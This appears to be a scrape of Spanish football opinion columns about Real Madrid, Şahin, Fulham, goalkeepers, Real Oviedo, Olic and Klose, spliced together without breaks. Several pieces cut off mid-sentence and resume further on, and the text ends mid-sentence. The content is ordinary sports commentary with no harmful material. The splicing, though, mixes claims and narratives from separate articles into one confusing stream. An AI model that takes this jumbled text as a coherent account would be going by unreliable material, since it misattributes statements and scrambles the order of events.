Madrid‘. Triunfar. A Nuri Şahin no le cabía otra idea en la cabeza que no fuera la de triunfar en el Real Madrid. Era la primavera de 2011. El joven mediocentro turco presidía la sala de máquinas del Borussia campeón de la Bundesliga y era reconocido como mejor jugador de la Bundesliga. Todo con apenas veintidós años. Diez millones de euros, cantidad que se consideró poco menos que una ganga en aquel momento, decidieron su traspaso al Bernabéu. La lanzadera estaba dispuesta. Todo apuntaba a que Şahin, a quien se cultivaría con supuesta paciencia bajo el manto protector de José Mourinho y al cobijo de Xabi Alonso, acabaría siendo un jugador referencial en Chamartín. Su fichaje se consideró un acierto de manera casi unánime, un ilusionante plan de futuro. Pero algo no salió como se esperaba.El nuevo jugador madridista llegó a Valdebebas con el ligamento lateral interno de su rodilla derecha dando guerra y acaparando un protagonismo sobrevenido. Una inoportuna lesión en un partido ante el Friburgo en la recta final de la temporada devino en un sinfín de problemas relacionados con una dolencia que parecía que nunca terminaba de remitir. Esguinces, distensiones, inflamaciones… el ligamento de Sahin parecía empeñado en frustrar su carrera como jugador blanco.Con la lógica inseguridad que genera en el futbolista la falta de confianza en su físico y con muchas cosas aún por demostrar, Sahin se vio sumido en una espiral interminable de recaídas, recuperaciones, visitas al gimnasio y falsas esperanzas, como aquella eliminatoria de Copa ante la Ponferradina. Y de repente apareció el miedo. El miedo que ni siquiera entraba en su cabeza cuando varios meses atrás había anunciado públicamente su compromiso con el Real Madrid con plena confianza en triunfar. El miedo a no estar a la altura de las enormes expectativas, el miedo a terminar con la paciencia de la grada del Bernabéu, el miedo a que José Mourinho, el técnico que tan firmemente habia apostado por él, decidiese retirarle su confianza. Era una sensación nueva, desconocida. Una sensación insólita en un chico que desde que se convirtiera en el futbolista más joven en debutar en la Bundesliga, con apenas dieciséis años, no había parado de crecer a ritmo de vértigo, sin tiempo para mirar atrás ni para equivocarse en la toma de decisiones. Sahin se rindió al poder del miedo. El miedo sepultó su talento.El turco tenía que alejarse del origen de sus temores. Tenía que abandonar el Bernabéu y la presión que suponía tener aún pendiente de justificación su fichaje por el Madrid un año después de su llegada. Apareció la opción de Liverpool, con un equipo en pleno proceso de reconstrucción y necesitado de talento en su zona de creación de juego. Sin embargo, ocurre a veces que el rendimiento se encuentra muy condicionado por el entorno y el escenario sobre el que se ofrece. Que la reacción ante un ambiente desconocido es la de apagar las luces, mirar al suelo y tratar de pasar lo más desapercibido posible. Ese era Sahin en Liverpool. En esas condiciones, su fútbol nunca volvería a brillar. ‘En Madrid y Liverpool nunca llegué a ser feliz. Y si no soy feliz, no puedo dar el cien por cien de lo que soy capaz‘. Sahin vio el cielo abierto cuando Jürgen Klopp decidió rescatar al turco de su naufragio en enero de 2013, sólo cinco meses después de su llegada a Anfield. Buscaba ser feliz, recuperar la autoestima y la confianza. Volver a un ambiente conocido y amable, en el que nadie iba a escrutar su rendimiento en cada minuto disfrutado sobre el césped. Al hoy centrocampista borusser aún le resta un año para cumplir el contrato que firmara en abril de 2011 con el Real Madrid. Feliz por fin en Westfalia, bien abrigado por Klopp, nada hace presumir su retorno al origen de su miedo. Una cierta sensación de incertidumbre sobrevoló Craven Cottage durante el pasado verano. Tras dieciséis productivos y exitosos años, Mohamed Al Fayed decidía poner punto y final a su trayectoria como propietario del Fulham FC. Su único argumento, no necesitaba ninguno más, fue que había alcanzado su propósito con el club: devolverlo a la elite y sanearlo económicamente. Al Fayed, que se hizo con el control del Fulham cuando el equipo malvivía en la tercera categoría del fútbol inglés y que consiguió estabilizarlo en la Premier League e incluso alcanzar una final europea por primera vez en su historia, traspasó sus poderes a Shahid Khan, multimillonario paquistaní propietario de los Jacksonville Jaguars de la NFL. Otro hombre de la liga de Al Fayed, otro gerifalte al que, presumiblemente, no le iba a fallar la pluma a la hora de estampar su firma en la chequera.Era complicado prever que el año de los Whites iba a ser tan complicado como lo está siendo. Con una plantilla profunda y con un buen puñado de futbolistas de referencia, el objetivo de la media tabla parecía asequible allá por el mes de agosto. Un equipo con Berbatov (ahora ya en Mónaco), Scott Parker, Stekelenburg, Sidwell o Hangeland ofrecía, a priori, una cierta fiabilidad.En el partido frente a Osasuna comprobamos que con Cristiano Ronaldo no basta. El portugués está en todas pero necesita un equipo que arrope sus internadas, que se vuelque en el ataque y no se pierda en la tibieza horizontal o la timidez en las zonas calientes del área. Ese es el perfil del togolés, un rematador con carácter y fuerza para continuar la jugada, para arramblar con el defensa contrario, cosas que el talentoso pero pazguato Benzema no ha logrado hacer desde que goza de la titularidad merengue.Por extraño que parezca, al Madrid le falta arriba esa sangre que los convirtió en contragolpeadotes eficientes, en atacantes corajudos, atenazadores, siempre directos a la mandíbula del oponente. Aquello que demostraba el último Inter de Mourinho, por cierto, y que le encumbró a la gloria particularmente en el partido de semifinales de Champions contra un Barcelona muy superior. Tres goles que eran la demostración de un estilo directo y eficaz que el Madrid ahora solo aboceta sobre el césped. Es un buen partido el de hoy para volver a creer en el colectivo. El Sevilla, pese a los resultados recientes, es un equipo que puede ganar a cualquiera. Tiene talento, mucho talento, aunque mal conjuntado. Su dominio de las bandas desarma a cualquier defensa y más si Marcelo juega en el costado. El brasileño es tan rápido y brillante como desnortado en las marcas. Navas o hasta Capel pueden borrarle del sitio. Ramos en el otro lado da más seguridad, siempre y cuando Khedira sepa tapar los huecos en las necesarias, y cada vez más escasas, galopadas de los laterales.Por ser una vuelta en el Bernabéu creo que veremos un partido vistoso. Mourinho no saldrá a defender, querrá asegurar la eliminatoria con un gol. No veo a un Madrid encerrado en casa con esa corta renta. Manzano debe espolear a sus hombres para empatar rápido y dejar hacer al rival, jugar a la contra aprovechando la velocidad de los puntas. La baja de Palop no debe ser obstáculo. El meta titular lleva meses a muy bajo nivel, sobreexcitado y poco seguro, la alternativa de Javi Varas es firme. Esperemos un partido de ocasiones, de juego directo, con más claridad que en la ida, con la intensidad convertida en fútbol y no en una guerra de entradas a destiempo, que la entrega tenga siempre el balón como instrumento. Decía Ubaldo Fillol que ”el arquero es la columna vertebral del equipo”. Yo no diría tanto, pero el campeón argentino no iba desencaminado. Ese jugador extraño, que viste diferente, que tiene sus propias reglas, soporta un peso mayor que el resto de sus compañeros. Detrás del portero ya no hay nadie. Un fallo suyo es gol. Demasiado lastre para la felicidad, demasiada responsabilidad para quien no está templado.Ahora que el Madrid, tras una obra a medio camino entre el “Esperando a Godot” de Beckett y “La lección” de Ionescu, se ha quedado sin De Gea; podemos volver a pensar en la importancia de un portero en los equipos de fútbol. En los grandes y en los pequeños. ¿Es Keylor peor que De Gea? ¿Estaba Casillas tan mal el año pasado? ¿Puede una buena defensa arreglar la indecisión de un portero? ¿Está Beto tan mal o es que el Sevilla aún no está ajustado atrás? ¿Qué culpa tuvo Ter Stegen en los goles del Athletic en la ida de la Supercopa? Son preguntas que ya han dado vueltas en la cabeza los aficionados, y eso que llevamos un mes de competición.El portero moderno, ese que debe jugar con el pie con criterio, que cierra la defensa y bascula con el resto del equipo, que debe ser valiente en las salidas por alto y certero en las salidas por bajo, que manda y ordena en defensa, que va al cruce como un líbero, que se debe adaptar a los nuevos balones, al césped mojado… es el jugador más exigido en el fútbol de hoy. A ningún otro jugador sobre el campo se le pide tanta versatilidad y arrojo. Hay diferencias entre Di Stefano y Romario, entre Matthäus y Yaya Toure, entre Moore y Ramos; pero hay un universo entre Banks y Valdés, entre Zoff y Buffon, entre Yashin y Casillas. Ni mejores ni peores, sólo distintos. Como dos posiciones diferentes. Dos escuelas, actitudes y responsabilidades.Un portero vale los millones que se pagan por él. El fallo de Romero este fin de semana con Van Gaal, los despropósitos de Inglaterra bajo palos, la inseguridad que está transmitiendo el Sevilla en estos momentos, la última temporada de Casillas en el Madrid, lo que sufrió un gran Barcelona con un portero mediocre como Busquets. Todo responde a las debilidades de porteros que no están centrados, que no son los que se les pide.Sólo es comprensible el éxito de Guardiola con un portero espectacular como Valdés o la Selección Española con un Casillas en la plenitud de su carrera. Generalmente, los grandes equipos siempre han tenido grandes porteros. La temporada del Atlético de Madrid con Courtois, un prodigio de colocación y concentración, o el Bayern de Neuer, el que dicen mejor portero del momento. O al menos, el que mejor cumple lo que se le exige al portero moderno. ¿Vale De Gea lo que se pretendía pagar por él? Sí. Van der Sar marcó un canon ganador: porteros de gran envergadura pero ágiles. Van der Sar (1,99 m), Courtois (1,99 m), Cech (1,96), De Gea (1,93 m); si comparamos vemos que es un nuevo modelo de portero. Con estiradas espectaculares y con un dominio por alto que debe ser inapelable. Por poner algunos ejemplos: Buyo (1´79 m), Zubizarreta (1,87 m), Ablanedo (1,77 m), Beto (1,81 m), Valdés (1,83 m). El juego a balón parado es determinante. El Atlético el año pasado metió 25 goles de cabeza. El Córdoba, que descendió, sólo 2. Me quedo en el Córdoba como ejemplo de lo que debe ser un portero. Razak fue uno de los guardametas más destacados el año pasado en la Liga Adelante. Militaba en el Mirandés. Jugó 29 partidos y recibió 23 goles. Este año ha empezado dubitativo.. . oh…  menudo… menudo genio! tras aquel casi gol de Pelé frente al  portero uruguayo. Significa abrazar a un amigo mío, ya fallecido,  en un sórdido apartamento en Hornsey en 1990, con la mente en éxtasis y la cabeza vacía de cualquier pensamiento que no fuese David Platt marcardo  contra Bélgica en el tiempo extra”. El que nos ofrece tan excelente fotografía, sorprendentemente nítida pese a la capa de nostalgia que la recubre,  del sentimiento inglés por su equipo nacional es David Baddiel, uno de los más respetados cómicos ingleses. En el  resto del planeta le recordamos por arrasar las listas de éxitos  británicas junto a su compañero  Frank Skinner y de paso ponernos los dientes largos, mientras los altavoces de nuestros campos siguen escupiendo las blasfemias musicales que todos conocemos. Sus  himnos dedicados a la selección inglesa, Three Lions en la Eurocopa 96 y la revisión del mismo para el Mundial 98, capturan tan bien como sus palabras la esencia misma del deporte. Están los futbolistas que ven los mismos espacios que cualquier zote desde la grada y los que fabrican lugares donde antes no había nada. Pablo Hervías pertenece a la segunda raza. Por eso es la mejor noticia para el oviedismo en esta vuelta irregular al fútbol que cuenta. Si fuera ciclista sonreiría en la cumbre antes de abrocharse el maillot y despeñarse a tumba abierta por las curvas enroscadas de algún puerto artero. Hay algo estimulante en ver a esos tipos esquivando el desastre en cada giro como el que no quiere la cosa. Algo inspirador en imaginar que avanzan como si la siguiente curva solo pudiera depararles un futuro mejor. Lo mismo sucede con los regateadores impenitentes como Hervías. Tras una década agarrándonos con temblores al pasamanos, no está mal subirse en él y bajar las escaleras de culo sin importarnos lo que pueda haber al final.Me gusta Hervías porque es un gran detector de gilipollas. Como pasaba con Dubovsky hasta que un resbalón le hizo llegar a los altares como se suele llegar a los altares en España, tendrá que escuchar silbidos de bala cada vez que agarre la pelota. Que si no defiende un pijo, que si le sobra un regate. Ningún problema, molestar a los agoreros es la mejor señal de que estás haciendo las cosas bien. Cuando Susaeta coló la enésima banana contra el Albacete, me vi llegando a casa seguro de que en la nevera hay comida; cuando Hervías se fue a la guerra unos segundos antes pensé en el amigo que aparece por sorpresa en el rellano con una botella de vino en la mano. Pablo viene a ser el azúcar del Oviedo, felicidad inmediata para el alma. La que nos ha faltado en doce años de depresión.Cuando el Oviedo amarró contra el Albacete la primera victoria de la temporada también me acordé de Pierino Fanna, el elemento rompedor en aquel Verona demoledor, provinciano pero orgulloso, que ganó la liga italiana en el 85. Por la banda derecha y a pie cambiado, aceleraba un calvo con seda en las botas. En Verona le bautizaron como Turbo Fanna, en Oviedo podemos empezar a pensar en Turbo Hervías.Foto: Real Oviedo Ivica Olic le explica a Dani Alves lo que va a hacer con él en el partidoA vosotros el arranque del Mundial os deja hablando del partidazo de Oscar, del saludo cariñoso y goleador de Neymar a los agoreros o de la comedia japonesa. A mí, que no tengo ni puta idea de fútbol, pensando en Ivica Olic. Así soy. Cambiando cinco cromos buenos por uno cualquiera que me gustaba a muerte. El último en llegar al centro cuando jugábamos a las sillas. Pero lo merece el orate balcánico por regalarnos la primera imagen de la Copa del Mundo.Olic, que gasta pinta como para protagonizar loquísimas fotografías de rusos, comenzó a buscar la cámara inmediatamente después de que el impresentable Nishimura abriera la función y a los diez minutos ya estaba posando. Cociendo el photobomb para la anfitriona. El centro para el gol croata fue suyo y los primeros sudores fríos en la nación del fútbol por él. Los flashes, las chorradas tuiteras, los memes… Todo tuvo que ver con el viejo Olic en el arranque del Mundial. Nos avisaron sobre Modric, sobre Rakitic pero los coletazos del veterano no aparecían en ninguna de las guías con las que vengo forrando el búnker mundialista desde hace semanas. Igual lo contaron en algún pdf pero de eso no gasto.Que Olic ridiculizara a uno de los mejores laterales derechos del mundo fue conmovedor. Porque uno cambia la vida coherente con la familia por el Mundial para disfrutar del sentido de la maravilla que ocurre de vez en cuando. Para que Camerún se la líe a Argentina, para que los gordos bailen a los atletas, para que cada partido nos escupa un David al editor de texto virgen. No sucede en demasiadas ocasiones y por eso conviene disfrutarlo.Esto no lo entendió Olic, que se vino arriba como el borracho que ignora la decadencia siempre segura tras los cinco minutos irresistibles. Su futbol enfiló el camino contrario, rápidamente hacia abajo como un bizcocho mal horneado. En poco más de media hora, el croata se tiró el ponche por la cabeza, amenazó con la trifulca en cada cruce de miradas, se colgó de las cortinas en pelotas y hasta se animó con el aurresku temerario al borde del área. Y Dani Alves parado enfrente, con la copa en la mano.Lo suyo fue conmovedor, sorprendente, gracioso y principalmente en vano, pero en treinta minutos un jugador de los que ya no importa nos brindó la primera imagen del Mundial. Quién lo hubiera dicho. Suena asquerosamente almibarado pero a las seis y media de la mañana, cuando la mayor parte de las personas que iban en aquel autobús rumbo a Pontevedra dormían arropadas por un silencio tan sólo resquebrajado por el débil ronroneo de la radio, yo, en duermevela me figuré que eran las múltiples ensoñaciones sobre el partido de los allí presentes, futuros goles y jugadas de asombro imaginadas, la verdadera fuerza que impulsaba el vehículo y no el combustible que acabábamos de repostar. Eran las seis de la mañana del pasado sábado y poco más de veinte personas se acercaban desde Madrid hasta Galicia para jugar, al lado de los otros once, el primero de los seis partidos que han de llevar al Real Oviedo de vuelta a la Segunda División.Es curioso pero experimento las mismas sensaciones antes de cada partido desde que era un crío. Creo que les ocurre a todos los hinchas y no digamos ya a los fanáticos. El cuerpo celebra pero el cerebro flota, y en ocasiones se ve inundado, por un extraño líquido que bien podría ser la destilación química de la ansiedad. Duermo pero no descanso y los nervios estrujan mi estómago hasta dejármelo del revés. Lo mismo nos ocurrió, y aquí incluyo a mi amigo José, compañero de afición desde que le conozco, el sábado pasado de camino a Pontevedra. Cantas para aliviar la tensión pero cuando tu mente consigue abstraerse por un momento del ambiente festivo, el líquido sigue trabajándote la voluntad.Aunque no todo es sufrimiento para el aficionado al infrafútbol. Llegamos a Pontevedra, preciosa la entrada sobre la majestuosa ría, y corroboré lo que ya sabía aunque no terminábamos de creer, que nosotros sólo éramos veinte más entre los cerca de cuatro mil azules que fueron a ayudar. Son esos momentos en los que, por alguna extraña razón te sientes aliviado y sabes que el equipo va a poder con todo. Aparecen conocidos de todas partes y el día se convierte en una cabalgata que discurre alegremente entre risas, cánticos, orbayu de alcoholes locales y el exquisito trato de los pontevedreses. Todo eso engaña a los sentidos y ayuda a precipitarse hasta la hora del encuentro.Llegamos a la grada una hora antes. Toda la tribuna de preferencia superior, parte del fondo sur y localidades sueltas hasta completar los 4.000 puestos son azules. El Oviedo jugó con un 4-1-4-1-4000. Empieza y se canta mucho pero algunos no las tenemos todas con nosotros. “Me da muy mala espina este partido” me repite José lamentando que muchos están vendiendo la piel del oso antes de cazarlo.En el partido del Valladolid apenas se le exigió, y aún así casi recibe un gol tras escapársele un balón. Contra el Leganés, tres goles en contra. El Leganés tiró cuatro veces a puerta. No es que Razak tenga culpa de la derrota, pero lo cierto es que un portero debe conseguir puntos, no perderlos. Ni Beto, ni Ryan, ni Adán parecen de momento ser la columna vertebral de su equipo. Tampoco Romero, que ahora deberá luchar contra De Gea para mantener el puesto en el equipo de Manchester. Keylor sí demostró ser un portero de clase el otro día, volviendo a recordar que un buen portero puede hacer un buen equipo. Y eso que ser un buen arquero, con estas exigencias, no está ya al alcance de cualquiera. Valoración de la temporadaRaspando la parte quemada de la tostada. Así me siento cuando hablo del Madrid de Mourinho. Quitando lo que sobra, lo carbonizado, lo molesto, lo desagradable al paladar. Ha sido una temporada fatigosa, tensa, radicalizada, de trincheras. Yo me caí del caballo a mitad de temporada, como un Pablo de Tarso en zapatillas de andar por casa. Me cansó Mourinho, su personaje, su manipulación capciosa de primero de bachiller, de delegado de clase con ínfulas. Me cansé de su política de perrito malcriado, de mearse en todas las esquinitas de la casa para marcar un territorio que, por otra parte, le pertenecía. Me adherí a los críticos, a los que decían que su labor sobrepasaba los límites de una institución poco dada a radicalismos. Y yo lo del “Señorío del Club” me lo tomo a broma, pero es cierto que algo ha habido en los intestinos del Real Madrid que ha hecho daño a un equipo incapaz de asumir el reto de revalidar la Liga y levantar, de una vez, la Copa de Europa. Hablar de esta temporada es hablar de un vestuario roto, de un campeonato doméstico abandonado demasiado pronto, de la ansiedad de una competición -la Champions– que se está convirtiendo en el chiste malo que cuenta cada año mi cuñado, de una final de Copa perdida, de unos delanteros insignificantes, de unos fichajes en el mejor de los casos superfluos, de periodismo pendenciero, de una plantilla desequilibrada y machacona. En resumen: de diez meses fácilmente olvidables.Momento especialEn la jornada número trece el Madrid estaba ya a once puntos del Barcelona. Ahí me di cuenta de que la plantilla había abandonado la Liga. El Betis ganó por un gol. El Barça apalizó al Levante. Se habló poco del tema. Europa entretenía. De alguna manera todos sabíamos que algo se había roto. Mourinho nos miraba con ternura desde su púlpito en la rueda de prensa. Pensé, pensamos muchos, que el entrenador tenía un plan. Una estrategia impopular, de la que era mejor hablar poco hasta mayo. Entonces todo daría igual. Fui cómplice del portugués. Le entendí. Me lo dijo con la mirada: “Mira chaval, ligas hay muchas pero Champions pocas. Vamos a dejarlo aquí, vamos a centrarnos en lo importante. Este año ganamos la décima. Yo me voy por la puerta grande. Tú puedes salir al día siguiente de la final con tu camiseta del Madrid a la calle. La liga me duele a mí más que a ti. Pero es un sacrificio necesario. Así llegaremos más frescos a Wembley. Esto se queda entre tú y yo. En mayo me lo agradecerás y lo sabes”. Jugador decisivoDos. Uno obvio y otro héroe por accidente. Cristiano Ronaldo es el mejor jugador de esta plantilla. Está siempre. Es la única nota de color en un equipo que se ha movido este año en la escala de grises. Por más tristeza y pucheros que arrastrase, es un jugador comprometido con el club. Hablar de dinero siempre es desagradable pero sobre el campo Cristiano siempre comparece. Este año, de nuevo, ha sido lo mejor del Madrid. El otro héroe ha sido Diego López. Un magnífico portero en mi opinión, extrañamente infrautilizado en un Sevilla que tampoco estaba para muchas florituras y que ha vuelto al Madrid por la puerta grande. Los motivos los desconozco. No sé que hizo a Mourinho prescindir de Casillas. Lo limpió, está claro. Por más excusas y partes médicos, primero con Adán y luego con Diego está claro que Casillas había perdido su puesto. La decisión podría haber sido un espectáculo circense si no hubiera sido por el buen rendimiento del portero gallego.DecepciónMuchas. Marcelo no ha estado al nivel que apuntó. Las lesiones no ayudaron pero tampoco se le vio fino cuando estuvo.Sin embargo, cosas del fútbol, el primer proyecto de Khan en el Cottage comenzó a dar bandazos descontrolados, hasta que las sacudidas, cada vez más violentas, terminaron llevándose por delante a Martin Jol, al que vino a reemplazar su compatriota, y excolaborador de Ferguson en el United, Rene Meulensteen.Pero el volantazo que supuso la destitución de Jol no fue suficiente para enderezar el rumbo. Tras apenas dos meses en el cargo y habiendo obtenido la victoria únicamente en cuatro (incluyendo uno de FA Cup) de los diecisiete partidos dirigidos, Meulensteen se enteró el pasado viernes de que Khan había perdido la confianza, si es que alguna vez la tuvo, en su trabajo. La destitución del técnico holandés huele a maniobra a la desesperada, a, como cantaba Morrissey, pánico en las calles de Londres (de Hammersmith y Fulham, en este caso concreto). Al otro lado del hilo del teléfono de la esperanza descolgaba un hombre con acento alemán. Felix Magath, hombre de mano férrea pero de nula experiencia fuera de la Bundesliga, se hará cargo del equipo en una apuesta que suena a pulsar los cuatro botones del mando de la consola al mismo tiempo. Lo mismo te sale un combo insuperable que te quedas frito en el sitio.La credibilidad del nuevo propietario del club del SW6 londinense pende de un hilo. Y no es que su labor al frente de la entidad haya sido merecedora de asumir responsabilidades por la pobre situación deportiva del equipo. Irse por el sumidero era algo que, previsiblemente, podía llegar a pasarle al Fulham. Sus propios seguidores admiten que no dejan de ser un club de segunda o tercera fila en la capital. Un equipo que, en los tres últimos lustros, supo aprovechar la estabilidad financiera proporcionada por Al Fayed. Poca culpa debería recaer sobre Shahid Khan tras un hipotético descenso a Championship. Puede caer más o menos simpático, puede parecer un advenedizo, un hombre en busca de popularidad en el Reino Unido con el único objetivo de dar cobertura a sus prósperos negocios… pero, como máxima autoridad del Fulham, algo tenía que hacer ante la marcha del equipo. Siempre he sostenido que no es mejor entrenador quien más partidos o más títulos gana con su equipo, sino quien es capaz de extraer el mejor potencial de la más mínima inversión. Ensalzo al entrenador que sabe valorar y apreciar aquello de lo que dispone, que no se detiene a lamentarse por no contar con tal o cual futbolista y que, aunque sea obligado por las circunstancias de su club, se adapta a las piezas de las que dispone en su plantilla sin pensar en lo que podría haber hecho de haber contado con ese delantero por el que suspira o con ese mediocentro que sería su ángel de la guarda soñado sobre el césped. Creo que una de las principales tareas de un entrenador, del nivel que éste sea, consiste en estudiar a fondo su plantilla, en evaluar las virtudes y los defectos de cada uno de sus jugadores para explotar unas y anular otros. Bajo mi punto de vista, no es mejor entrenador, por tanto, quien más éxitos cosecha, sino quien obtiene mayor rendimiento con menores recursos, quien maneja mejor sus piezasCuando Carlo Ancelotti recibió la fea noticia de que Sami Khedira, un pilar de su nuevo proyecto en el Real Madrid, había sufrido una grave lesión de rodilla en un partido amistoso disputado con la selección nacional alemana, simplemente lamentó la desgracia del jugador y masticó en silencio su mala fortuna. Sabía que a un buen técnico se le exige algo más que lloriquear por los esquinas para dar lástima a sus directivos y que estos le compren un juguete nuevo con el que sustituir al estropeado. No dudó un segundo el italiano: tenía que inventarse, con lo que tenía en su mano, una alternativa al mediocentro alemán.Ángel Di María había arrancado la presente temporada como casi todas las que lleva en la disciplina del Real Madrid: sin ser insustituible. El argentino estaba en ese punto de no entusiasmo en el que si llegaba una buena oferta por su traspaso casi nadie le hubiese visto con malos ojos. No es que fuese una moneda de cambio, pero su concurso no se veía como algo primordial en el nuevo proyecto blanco. Es el sino del jugador que no termina de encandilar, que no entusiasma por unanimidad, que ofrece buenas actuaciones pero muy aisladas y disipadas entre otras más intrascendentes y vacías. Sin un papel protagonista al que aferrarse cuando venían mal dadas, Di María sufrió serios desencuentros con el graderío, culminados por el estrambótico episodio de la colocación de la merienda. Bajo una situación de una toxicidad extrema, el Fideo parecía entonces estar más fuera que dentro del club. Fueron días complicados, en lo que quizá supuso la primera gran crisis de gestión de vestuario a la que hubo de enfrentarse Ancelotti tras su llegada a Chamartín. El problema no duró ni dos días. En lugar de colocar a su pupilo a los pies de los caballos y tirarse a la calle a reclamar nuevos refuerzos, el técnico italiano, futbolista antes que entrenador, tendió la mano al jugador. Dobló su confianza en él y decidió, en lugar de apartarlo y buscarle una salida, ofrecerle la posibilidad de una rehabilitación. Gesto, por otro lado, que suele actuar como vínculo de sangre entre técnico y futbolista.Adaptando al argentino a su 4-3-3 como acompañante de Alonso y Modric, Ancelotti se inventó un nuevo Di María, cumpliendo así con un triple objetivo: recuperar para la causa a un jugador que él entendía que podría llegar a serle muy útil, suplir con garantías la prolongada ausencia de Sami Khedira y reservar una plaza en el frente de ataque para Gareth Bale. Di María se ha destapado desde entonces como un servicial y abnegado trabajador del centro del campo. Un futbolista intenso, dotado además de esa capacidad tan suya para filtrar el pase entre líneas y asistido por su habitual facilidad para el desborde cuando se convierte en menester. Una sobresaliente gestión de un problema inesperado que, lejos de degenerar hasta convertirse en catástrofe, ha servido para multiplicar la utilidad de las piezas disponibles y, así, el potencial de su plantilla. Sin necesidad de lloriqueos, tirando de recursos. El Mundial, como todo acontecimiento que se celebre regularmente con una cierta periodicidad establecida, es una fantástica herramienta de medición y cálculo del tiempo. Estoy seguro de que eres incapaz de recordar qué estabas haciendo el día treinta y uno de mayo de 2002 a las ocho de la tarde. Pero si te pregunto a ti, futbolero de pro, sobre lo que estabas haciendo el día que la irrepetible Senegal de Diouf, Fadiga y Bouba Diop le estaba metiendo mano descaradamente a la Francia campeona del mundo y de Europa, seguro que eres capaz de precisar hasta la ropa que llevabas (o no) puesta en aquel momento. En este caso, la referencia resulta determinante para poder situarnos en el pasado.Piensa en doce años atrás. En la gente con la que ibas entonces, en tu día a día y tu actividad cotidiana, en tus preocupaciones… es el contraste entre el siempre crudo presente y el casi siempre agradable pasado el que te hace tomar consciencia del paso del tiempo, de lo que pueden cambiar las cosas en esos doce años. Es entonces, además, cuando realmente valoras en su justa medida hazañas como la de Miroslav Klose. ¿Cómo viviste tú el Mundial de 2002? Seguro que aún estudiabas. Que la causa de tu principal desvelo fuera el no encontrar un bar decente en el que poder ver a Argentina doblando la rodilla ante Inglaterra. Puede que incluso ni siquiera tuvieras edad como para ser considerado adolescente y que te interesara más bien poco que la generación dorada de Portugal se saliera con estrépito en la primera curva del Mundial asiático. Fuera como fuese en tu caso, Klose lo vivió marcando goles. Cinco en siete partidos. Como vivió el de 2006. Y el de Sudáfrica, en el año 2010. Y como vivirá el de que arrancará en apenas ocho días en Brasil, doce años más tarde de su irrupción en una Copa del Mundo, y ya bajo la perspectiva de una edad, 36, que hace pensar más en el cómodo retiro que en seguir violentando redes por esos campos de Dios.Lo de Kaká ya no es una decepción, sino una irritación crónica. Benzema e Higuaín y su cómica competición a inutilidad. Pepe y su flojísima temporada. La insoportable levedad de Coentrao. Essien, que se veía venir pero que dolía verlo así sobre el césped. La poca importancia de Modric en los partidos importantes, pese a los muchos minutos que ha tenido. Mourinho y su esperpento dominguero…Jugador RevelaciónVarane. De las pocas buenas noticias que ha dado el Madrid esta temporada. Está por curtir pero tiene pinta de tipo importante, de central de clase mundial. Si no se tuerce, la pareja de Ramos –definitivamente el mejor central que ha tenido el Madrid en muchos años- da muchas garantías.Claves de la planificación y expectativas para la próxima temporadaNo lo sé. Estoy en fase de abatimiento y escepticismo. Ancelotti no me fascina como entrenador. El mercado se va a mover poco. No está claro que Bale venga y si viene, no es tan obvio que sea lo que el Madrid necesita. Hay jugadores que ya no están para la plantilla: ni Albiol, ni Kaká ni Higuaín deberían continuar. Tampoco Callejón tras un año pobre comparado con su primera temporada. El centro del campo necesita aire atrás. Delante parece que Isco, Modric y Özil darán garantías pero Khedira y Alonso necesitan otro compañero de juegos. Si se va Diego López el Madrid necesita un portero. No creo que Adán sea ese portero, ni Jesús. Algún veterano. El otro día pensé en Julio César, que no debe estar muy caro tras lo del QPR. Carvajal puede suplir las carencias de Arbeloa. Y en la delantera no sabría qué hacer. Benzema no se basta. Está espeso, va por rachas, el Madrid no puede confiar su temporada a un jugador tan voluble. Se habló de Cavani, que ya no, y de Luís Suarez. Me gusta esa opción. Me gustaba más Tévez pero la Juve lo está haciendo tan bien que ya se lo llevó. El Madrid no debería hacer más experimentos con gaseosa. Es triste haber terminado la Liga con estos datos: de los 103 goles que ha marcado el Madrid en Liga su pareja de delanteros sólo han hecho 27. Poca chicha para tanto club. Estamos en lo de siempre, Cristiano es tan bueno que los delanteros palidecen. Benzema está bien, Higuaín era efectivo, pero hace tiempo que el Madrid no tiene un goleador de talla mundial. Muchos problemas en Europa vienen por ahí, falta ese tipo que de miedo delante. Es caro, pero más se gastó en Kaká. No sé que esperar del Real Madrid el año que viene.Lo de Mourinho ha sido Party Hard para todos los aficionados. Es imposible entender la cabeza del técnico portugués. El porqué de cada una de sus decisiones. El Madrid está huérfano de Europa pero no puede vivir llorando de la misma forma cada año.Y tiene  razón. Las sensaciones que yo tenía en el autobús las padece el equipo y le falta el aire, sale abrumado por la responsabilidad y juega con tres segundos de retraso. El resultado es que a las primeras de cambio vamos perdiendo y la eliminatoria se complica. Pero la afición sigue.Lo he vivido miles de veces pero la respuesta de la hinchada oviedista al recibir el gol fue espectacular. No cometeré la torpeza de comparar el graderío ovetense con lo que sucede en Anfield o Celtic Park pero el concepto es calcado. Cada vez que el Oviedo recibe un gol, siempre, la parroquia trata de impulsar a los futbolistas con el doble de intensidad. Se canta y se palmea como si la vida fuese en el intento. Así sucede en Pasarón y el equipo responde al final de la primera parte y en el comienzo de la segunda nivelando el choque gracias a un tanto de Perona. Las crónicas dirán que fue un mal gol, con el pecho tras la pésima salida del meta local. Otros que lo marcó con el escudo y que puede ser la llave para seguir adelante. Yo no me atrevo a narrarlo porque nada pude ver.En el estallido por aquel gol se liberan litros de adrenalina, litros de ese líquido química plasmación de la ansiedad en el que buceaba nuestro cerebro durante toda la semana, durante los últimos nueve años. Las gargantas se quiebran y las manos estén a punto de hacerlo en el aplauso. Algún desconocido me abraza con tanta fuerza que temo por la integridad de mis costillas y yo hago lo propio con el que tengo a mi lado. Bufandas volando por los aires hasta encontrar acomodo cuatro filas más allá y gritos que, viniendo de la entraña como vienen, sólo pueden clasificarse como guturales son la constatación del valor de ese gol. De ahí al final insiste el Oviedo y crea peligro pero con el partido abierto, en el abismo del minuto 70, los locales consiguen parar el marcador en el definitivo 2 a 1. Pese a obtener un buen resultado para la estrategia, perdemos y eso duele. No obstante, la grada despide al equipo tal y como lo recibió en el primer minuto del encuentro, con vítores y tratando de inyectarles la fuerza necesaria para darle la vuelta al asunto en casa. Como siempre. Demasiados años pisando campos regionales, demasiados desprecios y demasiado infrafútbol a cuestas como para estar contento hicieron que el viaje de regreso a Madrid se convirtiera en un rosario de caras largas. Trato de conciliar el sueño pero estoy tan cansado que apenas puedo pegar ojo hasta que a las siete de la mañana, más de un día después desde el comienzo del viaje, llego a mi casa y rendido, me pierdo en la almohada justo después de que una palabra se asome a mi pensamiento. Volveremos. Aquel cabrón era heavy metal. Pero no el ‘Master of Puppets’; Éric Di Meco fue 